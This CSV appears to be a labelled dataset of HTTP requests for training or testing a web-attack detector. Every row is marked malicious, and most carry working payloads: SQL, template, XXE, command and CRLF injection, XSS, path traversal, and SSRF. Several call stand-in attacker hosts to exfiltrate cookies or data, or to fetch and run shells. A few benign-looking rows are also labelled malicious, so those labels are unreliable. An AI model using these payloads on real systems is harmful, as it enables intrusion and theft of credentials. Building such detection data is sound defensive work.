"text","label"
"POST /search/xml HTTP/1.1
Host: enterprise-software-suite.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml
Content-Type: application/xml
Content-Length: 112
Cache-Control: no-cache

<searchRequest>
  <term>' or name()=name() or ''='</term>
  <category>all</category>
</searchRequest>","malicious"
"GET /search?q=latest HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/plain, */*
Referer: https://api.cloud-data-services.ai/dash{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20/etc/passwd').read() }} #}
Accept-Language: en-US,en;q=0.9","malicious"
"POST /user/profile HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Origin: https://community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
Referer: https://community.game-dev-forum.org/user/settings
Content-Length: 66
Connection: keep-alive

user_bio=Indie+game+enthusiast+%3C%21--%23iNcLuDe+ViRtUaL%3D%22%2Fproc%2Fcpuinfo%22+--%3E","malicious"
"GET /dashboard/stats HTTP/1.1
Host: metrics-insight-center.io
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive","malicious"
"POST /user/submit-feedback HTTP/1.1
Host: feedbackhub-vault.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://feedbackhub-vault.org/user/feedback-form
Content-Length: 109
Connection: close

feedback=Awesome+experience%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fmalsecured-channel.biz%2Fshell.php+-O+%2Ftmp%2Fsh.php%27%29%3B+%3F%3E","malicious"
"GET /user/settings?name=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: user-configurator.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive","malicious"
"GET /assets/scripts/..%2e/..%2e/..%2e/.ssh/id_rsa HTTP/1.1
Host: tech-support-portal.online
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://tech-support-portal.online/ticket/view?id=1234","malicious"
"POST /user/search HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: application/json
Content-Type: application/json
Content-Length: 87
Connection: close

{""searchFilter"": ""(&(uid=blogger)(objectClass=person))(|(uid=administrator))""}","malicious"
"GET /proxy/file%3A%2F%2F%2FUsers/admin/Documents/credentials.txt HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive","malicious"
"GET /media/proxy?imageUrl=http%3A%2F%2Fcdn-media-site.app%2Fmain%2Fheader.png&mode=scale&imageUrl=http%3A%2F%2F172.16.0.10%2Fstatus HTTP/1.1
Host: fast-content-api.ai
User-Agent: Python-urllib/3.8
Cache-Control: no-cache","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: application/json
Content-Type: application/json
Cookie: session_filter=(uid=guest%00; sessionid=3f4a9b7c2d1e5f8a
Content-Length: 18

{""query"":""laptop""}","malicious"
"POST /webhook/notify HTTP/1.1
Host: dev-gateway.fakecorp.io
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close

payload=update&status=success","malicious"
"GET /search?preview_text=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close","malicious"
"GET /app/dashboard HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 <!--#include virtual=""/etc/passwd"" -->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
X-Requested-With: XMLHttpRequest
Connection: keep-alive","malicious"
"POST /api/v1/profile/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept: application/json
X-SSL-Version: SSLv3
Content-Length: 75

{""displayName"":""Sam_\u003cscript\u003ealert(1)\u003c/script\u003e"",""bio"":""Hello world!""}","malicious"
"GET /shop/cart/view HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 <script>alert('LogViewerXSS')</script> (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive","malicious"
"POST /api/configureDevice HTTP/1.1
Host: secure-gateway.edge-networking.tech
User-Agent: Python-urllib/3.10
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 102

{""deviceId"":""fw-55"",""initCommand"":""/usr/local/sbin/init.sh || curl http://malicious-upload.safedomain.club/payload.sh | bash""}","malicious"
"POST /users/edit-profile HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.6
Cookie: forum_session=48fdb91eadc35f8dcd91

display_name=CrazyGamer&user_bio=<!--#Include   ViRtUaL='/var/www/html/includes/secret.key' -->","malicious"
"GET /portal/welcome?lang=en%250d%250aSet-Cookie%3A%20theme%3Ddarkmode HTTP/1.1
Host: my-personal-cloud.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Cache-Control: max-age=0
Connection: close","malicious"
"POST /api/v1/user/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 123
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-CSRF-Token: 5c7e4d3f-9b2a-4e8c-8f1d-2a3b6f7e9d0c

{""userId"":1987,""email"":""user1987@secure-user-portal.net"",""password"":""letmein' AnD (SeLeCt CoUnT(*) FrOm users) > 10 -- ""}","malicious"
"POST /api/importConfiguration HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Type: multipart/form-data; boundary=----WebKitBoundaryZ9Y8X7
Content-Length: 400
Cookie: authToken=5f2e7e0c7c0b608f20a7f9c8712b4e9a; Path=/; Secure; HttpOnly
Connection: keep-alive

------WebKitBoundaryZ9Y8X7
Content-Disposition: form-data; name=""uploadUser""

blog-admin
------WebKitBoundaryZ9Y8X7
Content-Disposition: form-data; name=""fileUpload""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------WebKitBoundaryZ9Y8X7--","malicious"
"GET /account/profile?category=2%27%20UNION%20SELECT%20%40%40VERSION%2C%20SLEEP%285%29%2C%20USER%28%29--%20 HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cookie: auth_token=6c860d1bdf5f794de9813f2f7d272b66; csrftoken=abc123efg456","malicious"
"POST /services/url-fetcher HTTP/1.1
Host: analytics-cloud-service.biz
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close

target_link=dict://localhost:11211/stats","malicious"
"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://dashboard.api.cloud-data-services.ai/uploader
Origin: https://dashboard.api.cloud-data-services.ai
Content-Type: multipart/form-data; boundary=----MyBoundary12345Abc
Content-Length: 410
Connection: keep-alive

------MyBoundary12345Abc
Content-Disposition: form-data; name=""description""

Configuration import for user request 90876
------MyBoundary12345Abc
Content-Disposition: form-data; name=""file""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------MyBoundary12345Abc--","malicious"
"GET /dashboard HTTP/1.1
Host: enterprise-cloud-solutions.io
X-Forwarded-For: 10.0.0.1%0d%0aInjected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/92.0.4515.159%20Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5","malicious"
"POST /login HTTP/1.1
Host: user-access.secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/login
Connection: close

username=alice%0d%0a127.0.0.1%20-%20admin%20%5B10/Oct/2023:13:55:36%20-0700%5D%20%22POST%20/admin/login%20HTTP/1.1%22%20200%20789&password=verysecret123","malicious"
"POST /app/xml/submitOrder HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/xml
Accept: application/xml, text/xml
Cache-Control: no-cache
Content-Length: 194

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE order [
<!ELEMENT order ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<product>
  <productId>&xxe;</productId>
  <description>Some product</description>
</product>","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Origin: https://api.cloud-data-services.ai
Content-Length: 69

query=normalsearch%0aid%0auname%20-a%0als%20-la%20/tmp","malicious"
"GET /public/avatars/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"POST /feedback/submit HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 163
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://secure-user-portal.net/feedback

username=alice&rating=5&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E","malicious"
"GET /documents/get?template=../../../../../../../../etc/passwd HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://my-personal-blog-site.info/home
Connection: keep-alive","malicious"
"GET /login?returnTo=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: smart-energy-grid.io
User-Agent: Wget/1.21.2 (linux-gnu)
Accept: */*
Referer: https://smart-energy-grid.io/login
Connection: keep-alive","malicious"
"GET /app/user/<iMg sRc=x OnErRoR=alert(document.cookie)>/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/app/home
Connection: keep-alive","malicious"
"POST /comments/post HTTP/1.1
Host: fastnews-aggregator.co
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 115

thread=75&comment_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSAgUEFTUyBXb3JkPSAncGFzc3dvcmQxMjMnIFdIRVJFIGlkPTEgLS0=","malicious"
"POST /api/v2/submit-feedback HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Content-Length: 219
Connection: close

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>","malicious"
"GET /docs/api-reference HTTP/1.1
Host: devportal.tech-innovations.org
User-Agent: Mozilla/5.0 ""><script>eval(atob('YWxlcnQoJ1VTRVIgU0VSVklDRSEnKQ=='))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive","malicious"
"POST /api/v2/user/profile/update HTTP/1.1
Host: user-access-control.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjozOH0.A5l3KjXKmNtjX-0uN0vLxUcq5DaTX8-GoA9SIwpKtsA
Content-Length: 261
Cache-Control: no-cache
Origin: https://login.user-access-control.net

{
  ""username"": ""harriet89"",
  ""profile_url"": ""/dashboard/%0d%0aSet-Cookie:%20malicious=stealdata;HttpOnly%0d%0a%0d%0a<script>fetch('http://attackerdomain.biz/log?cookie='+document.cookie)</script>"",
  ""redirect_url"": ""/app/home""
}","malicious"
"GET /dashboard/reports?id=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.analytics-portal.io%255C%255Clogs%2527%2529%2529%2529--%2520 HTTP/1.1
Host: analytics-portal.io
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9||eyJpZCI6IjEyMzQ1NiJ9||SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Referer: https://analytics-portal.io/dashboard","malicious"
"PUT /api/preferences/set_advanced HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 322
Accept: application/json, text/javascript, */*;q=0.01
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36

{""config"":{""user_settings"":{""preferences"":{""detail_level_param"":""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="",""currency"":""USD""}},""storefront"":{""enabled"":true}}}","malicious"
"GET /api/v1/check/host001%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://online-retail-store.biz/dashboard
Connection: keep-alive","malicious"
"POST /api/v2/profile HTTP/1.1
Host: nextgen-analytics.cloud
User-Agent: Wget/1.21.1
Accept: application/json
Content-Type: application/json
Content-Length: 89
X-Debug-Force: true

{""profile"":{""name"":""Alice"",""email"":""alice@nextgen-analytics.cloud"",""role"":""user""}}","malicious"
"GET /serve?resource=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afvar%c0%aflib%c0%afmysql%c0%afmy.cnf HTTP/1.1
Host: db-manager-tools.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: keep-alive","malicious"
"GET /network/utils/endpoint-9f3%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: devops-control-plane.cloud
User-Agent: Python-urllib/3.9
Accept: */*
Connection: close","malicious"
"POST /api/v1/redirect HTTP/1.1
Host: globalnews-network.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/json
Content-Length: 265
Connection: keep-alive
Cookie: gn_session=xyz987sessiontoken654

{""redirect_url"": ""/breaking-news%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://evilnews.globalnews-network.org%0d%0a%0d%0a<html><body>Redirecting you now...</body></html>""}","malicious"
"GET /auth/redirect?returnTo=http%3A%2F%2Fcommunity.news-aggregator-group.net%40attacker-tech.io%2Fhome HTTP/1.1
Host: login.community-news-aggregator.net
User-Agent: curl/7.77.0
Accept: */*
Connection: close","malicious"
"GET /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate
Cookie: session_filter=(uid=editor%00; session=9f8b7c6d5e4f3a2b1c0d","malicious"
"GET /inventory/list?product_id=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: supply-chain-network.io
User-Agent: Python-urllib/3.9
Accept-Encoding: gzip, deflate
Accept-Language: en
Connection: keep-alive
Cookie: sid=0146123ac9e23b14dfe023b51da; user=anonymous","malicious"
